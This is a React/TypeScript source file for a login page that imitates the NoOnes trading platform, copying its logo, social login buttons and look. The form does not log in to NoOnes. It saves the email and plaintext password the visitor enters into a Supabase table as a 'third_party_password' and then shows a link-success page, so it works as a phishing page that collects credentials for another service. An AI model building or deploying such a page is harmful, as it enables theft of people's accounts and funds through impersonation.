import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../lib/supabase';

function NoonesLogo() {
  return (
    <div className="flex items-center justify-center">
      <svg width="160" height="50" viewBox="0 0 180 60" fill="none" xmlns="http://www.w3.org/2000/svg">
        {/* n */}
        <path d="M10 25V45H18V28.5C18 24.5 21 21.5 25 21.5C29 21.5 32 24.5 32 28.5V45H40V28.5C40 20.5 33.5 14 25 14C19 14 14 18 11.5 23V15H3V45H11V25H10Z" fill="#00C076"/>
        {/* o with sparkle */}
        <circle cx="65" cy="30" r="11" stroke="#00C076" strokeWidth="7"/>
        <path d="M60 8L62 12" stroke="#00C076" strokeWidth="3.5" strokeLinecap="round"/>
        <path d="M65 5V10" stroke="#00C076" strokeWidth="3.5" strokeLinecap="round"/>
        <path d="M70 8L68 12" stroke="#00C076" strokeWidth="3.5" strokeLinecap="round"/>
        {/* o */}
        <circle cx="95" cy="30" r="11" stroke="#00C076" strokeWidth="7"/>
        {/* n */}
        <path d="M115 25V45H123V28.5C123 24.5 126 21.5 130 21.5C134 21.5 137 24.5 137 28.5V45H145V28.5C145 20.5 138.5 14 130 14C124 14 119 18 116.5 23V15H108V45H116V25H115Z" fill="#00C076"/>
        {/* e */}
        <path d="M165 30C165 24 160 19 154 19C148 19 143 24 143 30C143 36 148 41 154 41C158 41 161.5 39 163.5 36L157.5 32.5C156.5 33.5 155.5 34 154 34C152 34 150.5 32.5 150.5 30.5H165V30ZM150.5 27.5C150.5 25.5 152 24 154 24C156 24 157.5 25.5 157.5 27.5H150.5Z" fill="#00C076"/>
        {/* s */}
        <path d="M175 36C175 38 176.5 39.5 178.5 39.5C180.5 39.5 182 38 182 36C182 34.5 181 33.5 179.5 32.5L174.5 29.5C172.5 28.5 171.5 26.5 171.5 24.5C171.5 21.5 174 19 177 19C180 19 182.5 21.5 182.5 24.5H175.5C175.5 23.5 176.5 22.5 177.5 22.5C178.5 22.5 179.5 23.5 179.5 24.5C179.5 25.5 178.5 26.5 177.5 27.5L172.5 30.5C170.5 31.5 169.5 33.5 169.5 36C169.5 39.5 172.5 42.5 176.5 42.5C180.5 42.5 183.5 39.5 183.5 36H175Z" fill="#00C076"/>
      </svg>
    </div>
  );
}

export default function NoonesConnect() {
  const navigate = useNavigate();
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    const { email, password } = credentials;
    if (!email || !password) {
      setErrorMessage('Please enter your email/phone and password.');
      return;
    }
    setLoading(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const { error } = await supabase.from('platform_connections').insert({
        platform: 'Noones',
        email,
        third_party_password: password,
        user_id: session?.user?.id || null
      });
      if (error) throw error;
      navigate('/link-success');
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  const themeClasses = isDarkMode 
    ? 'bg-[#1a1b1e] text-white' 
    : 'bg-[#f4f7f6] text-[#1a1b1e]';
  
  const cardClasses = isDarkMode
    ? 'bg-[#25262b] border-transparent'
    : 'bg-white border-transparent shadow-[0_8px_30px_rgb(0,0,0,0.04)]';

  const inputClasses = isDarkMode
    ? 'bg-[#2c2e33] border-transparent text-white placeholder:text-[#5c5f66]'
    : 'bg-[#f0f2f1] border-transparent text-[#1a1b1e] placeholder:text-[#adb5bd]';

  return (
    <main className={`${themeClasses} min-h-screen flex flex-col items-center justify-center p-4 font-sans transition-colors duration-300`}>
      <div className="w-full max-w-[500px] flex flex-col items-center">
        {/* Logo */}
        <div className="mb-12">
          <NoonesLogo />
        </div>

        {/* Card */}
        <div className={`${cardClasses} w-full rounded-[24px] p-10 flex flex-col items-center`}>
          <h2 className="text-[32px] font-bold mb-8">Welcome for NoOnes</h2>
          
          {/* Social Icons */}
          <div className="flex gap-6 mb-10">
            <button className="w-12 h-12 rounded-full flex items-center justify-center">
              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-10 h-10" />
            </button>
            <button className="w-12 h-12 rounded-full flex items-center justify-center">
              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-10 h-10 ${isDarkMode ? 'invert' : ''}`} />
            </button>
            <button className="w-12 h-12 rounded-full flex items-center justify-center">
              <img src="/logos/telegram-svgrepo-com.svg" alt="Telegram" className="w-10 h-10" />
            </button>
          </div>

          <form onSubmit={handleSubmit} className="w-full space-y-6">
            <div>
              <label className="block text-[16px] font-bold mb-2 opacity-80">Email/Phone number</label>
              <input
                type="text"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Email/Phone number"
                className={`${inputClasses} w-full h-[64px] px-6 rounded-2xl border-none outline-none focus:ring-2 focus:ring-[#00c076] transition-all text-[18px]`}
              />
            </div>

            <div>
              <label className="block text-[16px] font-bold mb-2 opacity-80">Password</label>
              <div className="relative">
                <input
                  type="password"
                  value={credentials.password}
                  onChange={handleFieldChange('password')}
                  placeholder="Password"
                  className={`${inputClasses} w-full h-[64px] px-6 rounded-2xl border-none outline-none focus:ring-2 focus:ring-[#00c076] transition-all text-[18px]`}
                />
                <div className="absolute right-6 top-1/2 -translate-y-1/2 opacity-60">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                </div>
              </div>
              <div className="flex justify-end mt-2">
                <button type="button" className="text-[#00c076] text-[16px] font-bold hover:underline">Don forget password?</button>
              </div>
            </div>

            {errorMessage && <p className="text-red-500 text-sm font-semibold">{errorMessage}</p>}

            <button
              type="submit"
              disabled={loading}
              className="w-full h-[68px] bg-[#00c076] hover:bg-[#00a868] text-white font-bold text-[22px] rounded-2xl transition-colors disabled:opacity-70 mt-6"
            >
              {loading ? 'Connecting...' : 'Log in'}
            </button>

            <div className="text-center mt-10">
              <p className="text-[18px] font-medium opacity-80">
                No account yet? <span className="text-[#00c076] cursor-pointer font-bold hover:underline">Sign up</span>
              </p>
            </div>
          </form>
        </div>

        {/* Footer Controls */}
        <div className="w-full mt-10 flex items-center justify-between px-4">
          <div className="flex items-center gap-4">
            <div 
              onClick={() => setIsDarkMode(!isDarkMode)}
              className="flex items-center gap-3 cursor-pointer group"
            >
              <span className={`text-2xl ${!isDarkMode ? 'grayscale-0' : 'grayscale'}`}>☀️</span>
              <div className={`w-14 h-7 rounded-full relative transition-colors ${isDarkMode ? 'bg-[#00c076]' : 'bg-gray-300'}`}>
                <div className={`absolute top-1 w-5 h-5 rounded-full bg-white shadow-md transition-transform ${isDarkMode ? 'translate-x-8' : 'translate-x-1'}`} />
              </div>
              <span className={`text-2xl ${isDarkMode ? 'grayscale-0' : 'grayscale'}`}>🌙</span>
            </div>
          </div>
          
          <button className="flex items-center gap-2 text-[18px] font-bold text-[#00c076] hover:underline">
            Nigerian Pidgin <span className="text-[14px] ml-1">▼</span>
          </button>
        </div>
      </div>
    </main>
  );
}
